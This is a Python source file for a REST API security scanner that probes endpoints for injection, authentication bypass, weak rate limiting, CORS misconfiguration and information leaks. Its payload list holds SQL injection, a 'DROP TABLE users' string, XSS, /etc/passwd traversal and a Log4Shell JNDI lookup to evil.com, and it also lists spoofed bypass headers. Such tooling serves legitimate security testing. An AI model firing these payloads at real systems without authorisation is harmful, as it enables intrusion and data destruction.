"""
REST API Security Analyzer
Comprehensive security analysis for REST APIs including authentication, authorization, input validation, and business logic testing.
"""

import json
import logging
import re
import time
from typing import Dict, List, Any, Optional
from urllib.parse import urljoin, urlparse

import requests
from rich.console import Console

from ..utils.debug_utils import debug_print

class RESTAPIAnalyzer:
    """REST API security analyzer."""
    
    def __init__(self, debug: bool = False):
        """Initialize the REST API analyzer."""
        self.debug = debug
        self.console = Console()
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'APISecurityTester/1.0'
        })
        
        # Common test payloads
        self.injection_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "<script>alert('XSS')</script>",
            "../../../etc/passwd",
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}",
            "'; WAITFOR DELAY '00:00:05'--"
        ]
        
        self.auth_bypass_payloads = [
            "null",
            "undefined",
            "true",
            "false",
            "0",
            "1",
            "admin",
            "test",
            "guest"
        ]
    
    def analyze(self, base_url: str, openapi_spec: str = None, 
                endpoints: List[str] = None) -> Dict[str, Any]:
        """Perform comprehensive REST API security analysis."""
        debug_print("Starting REST API analysis for:", base_url)
        
        results = {
            "base_url": base_url,
            "endpoints_discovered": [],
            "authentication_issues": [],
            "authorization_issues": [],
            "input_validation_issues": [],
            "business_logic_issues": [],
            "information_disclosure": [],
            "vulnerabilities": []
        }
        
        try:
            # Discover endpoints
            if openapi_spec:
                results["endpoints_discovered"] = self._parse_openapi_spec(openapi_spec)
            elif endpoints:
                results["endpoints_discovered"] = endpoints
            else:
                results["endpoints_discovered"] = self._discover_endpoints(base_url)
            
            debug_print("Discovered endpoints:", len(results["endpoints_discovered"]))
            
            # Test each endpoint
            for endpoint in results["endpoints_discovered"]:
                endpoint_results = self._test_endpoint(base_url, endpoint)
                
                # Merge results
                for key in ["authentication_issues", "authorization_issues", 
                           "input_validation_issues", "business_logic_issues", 
                           "information_disclosure", "vulnerabilities"]:
                    results[key].extend(endpoint_results.get(key, []))
            
            # Perform additional tests
            results.update(self._test_authentication_bypass(base_url))
            results.update(self._test_rate_limiting(base_url))
            results.update(self._test_cors_misconfig(base_url))
            
        except Exception as e:
            debug_print("Error during REST API analysis:", str(e))
            results["error"] = str(e)
        
        return results
    
    def _parse_openapi_spec(self, spec_file: str) -> List[str]:
        """Parse OpenAPI specification to extract endpoints."""
        try:
            with open(spec_file, 'r') as f:
                spec = json.load(f)
            
            endpoints = []
            for path, methods in spec.get("paths", {}).items():
                for method in methods.keys():
                    endpoints.append(f"{method.upper()} {path}")
            
            return endpoints
        except Exception as e:
            debug_print("Error parsing OpenAPI spec:", str(e))
            return []
    
    def _discover_endpoints(self, base_url: str) -> List[str]:
        """Discover API endpoints through common patterns."""
        common_paths = [
            "/api/v1/users",
            "/api/v1/admin",
            "/api/users",
            "/api/admin",
            "/users",
            "/admin",
            "/auth",
            "/login",
            "/logout",
            "/register",
            "/profile",
            "/settings"
        ]
        
        discovered = []
        for path in common_paths:
            url = urljoin(base_url, path)
            try:
                response = self.session.get(url, timeout=10)
                if response.status_code != 404:
                    discovered.append(f"GET {path}")
            except:
                pass
        
        return discovered
    
    def _test_endpoint(self, base_url: str, endpoint: str) -> Dict[str, Any]:
        """Test individual endpoint for security issues."""
        debug_print("Testing endpoint:", endpoint)
        
        method, path = endpoint.split(" ", 1)
        url = urljoin(base_url, path)
        
        results = {
            "authentication_issues": [],
            "authorization_issues": [],
            "input_validation_issues": [],
            "business_logic_issues": [],
            "information_disclosure": [],
            "vulnerabilities": []
        }
        
        try:
            # Test without authentication
            response = self.session.request(method, url, timeout=10)
            
            # Check for authentication bypass
            if response.status_code == 200:
                results["authentication_issues"].append({
                    "endpoint": endpoint,
                    "issue": "No authentication required",
                    "severity": "high",
                    "description": "Endpoint accessible without authentication"
                })
            
            # Test with injection payloads
            if method in ["POST", "PUT", "PATCH"]:
                injection_results = self._test_injection(url, method)
                results["input_validation_issues"].extend(injection_results)
            
            # Test for information disclosure
            info_disclosure = self._test_information_disclosure(response)
            results["information_disclosure"].extend(info_disclosure)
            
        except Exception as e:
            debug_print(f"Error testing endpoint {endpoint}:", str(e))
        
        return results
    
    def _test_injection(self, url: str, method: str) -> List[Dict[str, Any]]:
        """Test for injection vulnerabilities."""
        issues = []
        
        # Test JSON injection
        for payload in self.injection_payloads:
            try:
                data = {
                    "username": payload,
                    "password": payload,
                    "email": f"{payload}@test.com"
                }
                
                response = self.session.request(method, url, json=data, timeout=10)
                
                # Check for injection indicators
                if self._detect_injection_success(response, payload):
                    issues.append({
                        "url": url,
                        "method": method,
                        "payload": payload,
                        "issue": "Potential injection vulnerability",
                        "severity": "high",
                        "description": f"Injection payload '{payload}' may have been processed"
                    })
                    
            except Exception as e:
                debug_print(f"Error testing injection for {url}:", str(e))
        
        return issues
    
    def _test_information_disclosure(self, response) -> List[Dict[str, Any]]:
        """Test for information disclosure in responses."""
        issues = []
        
        # Check for sensitive headers
        sensitive_headers = [
            "server", "x-powered-by", "x-aspnet-version", 
            "x-aspnetmvc-version", "x-runtime"
        ]
        
        for header in sensitive_headers:
            if header in response.headers:
                issues.append({
                    "issue": "Information disclosure in headers",
                    "severity": "medium",
                    "description": f"Sensitive header '{header}' exposed",
                    "value": response.headers[header]
                })
        
        # Check for error messages
        if response.status_code >= 400:
            try:
                error_data = response.json()
                if "error" in error_data or "message" in error_data:
                    issues.append({
                        "issue": "Detailed error messages",
                        "severity": "medium",
                        "description": "Detailed error information exposed",
                        "value": str(error_data)
                    })
            except:
                pass
        
        return issues
    
    def _test_authentication_bypass(self, base_url: str) -> Dict[str, Any]:
        """Test for authentication bypass techniques."""
        debug_print("Testing authentication bypass techniques")
        
        bypass_issues = []
        
        # Test common bypass techniques
        bypass_headers = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Original-URL": "/admin"},
            {"X-Rewrite-URL": "/admin"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"Authorization": "null"},
            {"Authorization": "undefined"},
            {"Authorization": "Bearer null"},
            {"Authorization": "Bearer undefined"}
        ]
        
        for headers in bypass_headers:
            try:
                response = self.session.get(base_url, headers=headers, timeout=10)
                if response.status_code == 200:
                    bypass_issues.append({
                        "issue": "Authentication bypass possible",
                        "severity": "critical",
                        "description": f"Bypass using headers: {headers}",
                        "headers": headers
                    })
            except:
                pass
        
        return {"authentication_bypass": bypass_issues}
    
    def _test_rate_limiting(self, base_url: str) -> Dict[str, Any]:
        """Test for rate limiting bypass."""
        debug_print("Testing rate limiting")
        
        rate_limit_issues = []
        
        # Test rapid requests
        try:
            responses = []
            for i in range(100):
                response = self.session.get(base_url, timeout=5)
                responses.append(response.status_code)
                time.sleep(0.1)
            
            # Check if rate limiting is enforced
            success_count = sum(1 for code in responses if code == 200)
            if success_count > 50:
                rate_limit_issues.append({
                    "issue": "Weak rate limiting",
                    "severity": "medium",
                    "description": f"Rate limiting allows {success_count}/100 rapid requests"
                })
                
        except Exception as e:
            debug_print("Error testing rate limiting:", str(e))
        
        return {"rate_limiting_issues": rate_limit_issues}
    
    def _test_cors_misconfig(self, base_url: str) -> Dict[str, Any]:
        """Test for CORS misconfiguration."""
        debug_print("Testing CORS configuration")
        
        cors_issues = []
        
        # Test CORS headers
        try:
            response = self.session.options(base_url, timeout=10)
            
            if "Access-Control-Allow-Origin" in response.headers:
                origin = response.headers["Access-Control-Allow-Origin"]
                if origin == "*":
                    cors_issues.append({
                        "issue": "CORS misconfiguration",
                        "severity": "medium",
                        "description": "Wildcard CORS policy allows any origin"
                    })
                    
        except Exception as e:
            debug_print("Error testing CORS:", str(e))
        
        return {"cors_issues": cors_issues}
    
    def _detect_injection_success(self, response, payload: str) -> bool:
        """Detect if injection was successful."""
        indicators = [
            "sql syntax",
            "mysql error",
            "oracle error",
            "postgresql error",
            "sqlite error",
            "syntax error",
            "unclosed quotation mark",
            "unterminated string",
            "division by zero",
            "stack trace",
            "exception"
        ]
        
        response_text = response.text.lower()
        
        # Check for error indicators
        for indicator in indicators:
            if indicator in response_text:
                return True
        
        # Check for payload reflection
        if payload.lower() in response_text:
            return True
        
        return False 